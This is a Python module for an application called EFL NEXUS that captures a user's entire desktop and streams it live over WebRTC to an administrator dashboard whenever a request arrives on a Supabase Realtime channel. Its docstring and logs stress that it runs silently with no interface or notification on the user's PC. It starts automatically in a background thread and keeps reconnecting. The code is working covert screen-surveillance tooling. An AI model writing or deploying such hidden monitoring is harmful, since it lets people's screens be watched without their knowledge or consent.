"""Enterprise silent real-time WebRTC desktop streamer for EFL NEXUS.
Allows authorized administrators to view the user's entire desktop live at 15-20 FPS.
Operates completely silently with zero UI or notification footprint on the user's PC.
Uses 0% CPU and 0% bandwidth when not actively being viewed.
"""
import asyncio
import json
import logging
import threading
import time
from uuid import uuid4

import av
import mss
import numpy as np
from aiortc import (
    RTCConfiguration,
    RTCIceCandidate,
    RTCIceServer,
    RTCPeerConnection,
    RTCSessionDescription,
    VideoStreamTrack,
)
from aiortc.mediastreams import MediaStreamError
from aiortc.sdp import candidate_from_sdp
import websockets

from .security import load_machine_credential

logger = logging.getLogger(__name__)

STUN_SERVERS = [
    RTCIceServer(urls=[
        "stun:stun.l.google.com:19302",
        "stun:stun1.l.google.com:19302",
        "stun:stun2.l.google.com:19302",
    ])
]


class DesktopVideoStreamTrack(VideoStreamTrack):
    """High-speed desktop video stream capturing the entire primary display at target 20 FPS."""

    def __init__(self, fps=20):
        super().__init__()
        self.fps = fps
        self.sct = mss.mss()
        # Monitor 1 is the primary desktop display in mss
        self.monitor = self.sct.monitors[1] if len(self.sct.monitors) > 1 else self.sct.monitors[0]
        self._running = True

    def stop(self):
        self._running = False
        super().stop()
        try:
            self.sct.close()
        except Exception:
            pass

    async def recv(self):
        if not self._running:
            raise MediaStreamError("Track stopped")

        pts, time_base = await self.next_timestamp()

        # Zero-copy capture of full desktop
        img = self.sct.grab(self.monitor)
        # Ensure dimensions are even for video codec compatibility
        w = (img.width // 2) * 2
        h = (img.height // 2) * 2
        arr = np.frombuffer(img.raw, dtype=np.uint8).reshape((img.height, img.width, 4))
        bgr = arr[:h, :w, :3]

        # Construct hardware-compatible video frame
        frame = av.VideoFrame.from_ndarray(bgr, format="bgr24")
        frame.pts = pts
        frame.time_base = time_base
        return frame


class ScreenStreamService:
    """Background service listening on Supabase Realtime channel for admin live stream requests."""

    def __init__(self, stop_event=None):
        self.stop_event = stop_event or threading.Event()
        self.thread = None
        self.loop = None
        self.pc = None
        self.track = None
        self.device_id = None
        self.ws = None

    def start(self):
        """Start background signaling and streaming thread."""
        if self.thread and self.thread.is_alive():
            return
        self.thread = threading.Thread(target=self._run_event_loop, name="EFL_ScreenStreamer", daemon=True)
        self.thread.start()
        logger.info("ScreenStreamService background thread started.")

    def stop(self):
        """Signal thread to stop and clean up WebRTC peer connections."""
        self.stop_event.set()
        if self.loop and self.loop.is_running():
            self.loop.call_soon_threadsafe(self._cleanup_sync)
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=2.0)
        logger.info("ScreenStreamService stopped.")

    def _cleanup_sync(self):
        if self.loop and not self.loop.is_closed():
            self.loop.create_task(self._cleanup())

    async def _cleanup(self):
        if self.track:
            try:
                self.track.stop()
            except Exception:
                pass
            self.track = None
        if self.pc:
            try:
                await self.pc.close()
            except Exception:
                pass
            self.pc = None
        if self.ws:
            try:
                await self.ws.close()
            except Exception:
                pass
            self.ws = None

    def _run_event_loop(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_until_complete(self._main_worker())
        except Exception as e:
            logger.debug("Screen streamer event loop terminated: %s", e)
        finally:
            self.loop.run_until_complete(self._cleanup())
            self.loop.close()

    async def _main_worker(self):
        backoff = 3.0
        while not self.stop_event.is_set():
            cred = load_machine_credential()
            if not cred or not cred.get("device_id") or not cred.get("key"):
                # Waiting for machine to auto-register
                await asyncio.sleep(4.0)
                continue

            self.device_id = str(cred["device_id"])
            supabase_url = cred.get("url", "https://wykmgymitdxkqbpywpzh.supabase.co")
            api_key = cred["key"]

            host = supabase_url.replace("https://", "").replace("http://", "").rstrip("/")
            ws_url = f"wss://{host}/realtime/v1/websocket?apikey={api_key}&vsn=1.0.0"
            topic = f"realtime:nexus:screen:{self.device_id}"

            try:
                logger.debug("Connecting to Realtime signaling at %s", topic)
                async with websockets.connect(
                    ws_url,
                    ping_interval=20,
                    ping_timeout=15,
                    close_timeout=5,
                ) as ws:
                    self.ws = ws
                    backoff = 3.0  # Reset backoff upon successful connection

                    # Join device-specific screen channel
                    join_msg = {
                        "topic": topic,
                        "event": "phx_join",
                        "payload": {"config": {"broadcast": {"self": False}}},
                        "ref": "join_screen"
                    }
                    await ws.send(json.dumps(join_msg))

                    # Spawn heartbeat task
                    heartbeat_task = asyncio.create_task(self._heartbeat_loop(ws))

                    try:
                        while not self.stop_event.is_set():
                            raw_msg = await ws.recv()
                            await self._handle_realtime_message(ws, topic, raw_msg)
                    finally:
                        heartbeat_task.cancel()
            except (websockets.ConnectionClosed, OSError) as e:
                logger.debug("Realtime screen signaling disconnected (%s). Reconnecting in %.1fs...", e, backoff)
            except Exception as e:
                logger.debug("Screen streamer loop exception: %s", e)

            if not self.stop_event.is_set():
                await asyncio.sleep(backoff)
                backoff = min(backoff * 1.5, 30.0)

    async def _heartbeat_loop(self, ws):
        count = 1
        while not self.stop_event.is_set():
            await asyncio.sleep(25.0)
            try:
                hb = {
                    "topic": "phoenix",
                    "event": "heartbeat",
                    "payload": {},
                    "ref": f"hb_{count}"
                }
                await ws.send(json.dumps(hb))
                count += 1
            except Exception:
                break

    async def _send_broadcast(self, ws, topic, event_name, payload):
        msg = {
            "topic": topic,
            "event": "broadcast",
            "payload": {
                "type": "broadcast",
                "event": event_name,
                "payload": payload
            },
            "ref": str(uuid4())
        }
        await ws.send(json.dumps(msg))

    async def _handle_realtime_message(self, ws, topic, raw_msg):
        try:
            data = json.loads(raw_msg)
        except Exception:
            return

        event = data.get("event")
        payload = data.get("payload", {})

        if event != "broadcast":
            return

        b_event = payload.get("event")
        b_data = payload.get("payload", {})

        if b_event == "screen:request_offer":
            await self._handle_request_offer(ws, topic, b_data)
        elif b_event == "screen:ice_candidate":
            await self._handle_remote_ice(b_data)
        elif b_event == "screen:stop_stream":
            await self._handle_stop_stream()

    async def _handle_request_offer(self, ws, topic, data):
        logger.info("Received admin screen viewing offer. Starting silent 20 FPS desktop capture...")
        # Clean up any existing connection
        await self._cleanup_peer()

        config = RTCConfiguration(iceServers=STUN_SERVERS)
        pc = RTCPeerConnection(configuration=config)
        self.pc = pc

        # Create silent 20 FPS full-desktop track
        track = DesktopVideoStreamTrack(fps=20)
        self.track = track
        pc.addTrack(track)

        @pc.on("icecandidate")
        async def on_ice(candidate):
            if candidate and not self.stop_event.is_set():
                await self._send_broadcast(ws, topic, "screen:ice_candidate", {
                    "candidate": candidate.candidate,
                    "sdpMid": candidate.sdpMid,
                    "sdpMLineIndex": candidate.sdpMLineIndex
                })

        @pc.on("connectionstatechange")
        async def on_conn_change():
            logger.info("Screen stream connection state changed: %s", pc.connectionState)
            if pc.connectionState in ("failed", "closed"):
                await self._cleanup_peer()

        try:
            # Set Remote SDP Offer from Admin Dashboard
            offer = RTCSessionDescription(sdp=data["sdp"], type=data["type"])
            await pc.setRemoteDescription(offer)

            # Create and set Local SDP Answer
            answer = await pc.createAnswer()
            await pc.setLocalDescription(answer)

            # Wait briefly (up to 1.5s) for initial ICE candidates to gather
            for _ in range(15):
                if pc.iceGatheringState == "complete":
                    break
                await asyncio.sleep(0.1)

            # Transmit SDP answer back to Admin Dashboard
            await self._send_broadcast(ws, topic, "screen:answer", {
                "sdp": pc.localDescription.sdp,
                "type": pc.localDescription.type
            })
            logger.info("WebRTC answer sent to admin dashboard. Live stream active.")
        except Exception as e:
            logger.warning("Failed to establish WebRTC screen stream: %s", e)
            await self._cleanup_peer()

    async def _handle_remote_ice(self, data):
        if not self.pc:
            return
        candidate_str = data.get("candidate")
        if not candidate_str:
            return
        try:
            cand = candidate_from_sdp(candidate_str)
            cand.sdpMid = data.get("sdpMid")
            cand.sdpMLineIndex = data.get("sdpMLineIndex")
            await self.pc.addIceCandidate(cand)
        except Exception as e:
            logger.debug("Could not add remote ICE candidate: %s", e)

    async def _handle_stop_stream(self):
        logger.info("Admin closed screen view. Stopping desktop capture and encoder.")
        await self._cleanup_peer()

    async def _cleanup_peer(self):
        if self.track:
            try:
                self.track.stop()
            except Exception:
                pass
            self.track = None
        if self.pc:
            try:
                await self.pc.close()
            except Exception:
                pass
            self.pc = None


_global_screen_streamer = None


def start_screen_streamer():
    """Singleton launcher called by EFL_NEXUS application on startup."""
    global _global_screen_streamer
    if _global_screen_streamer is None:
        _global_screen_streamer = ScreenStreamService()
        _global_screen_streamer.start()
    return _global_screen_streamer


def stop_screen_streamer():
    """Graceful teardown on application shutdown."""
    global _global_screen_streamer
    if _global_screen_streamer is not None:
        _global_screen_streamer.stop()
        _global_screen_streamer = None
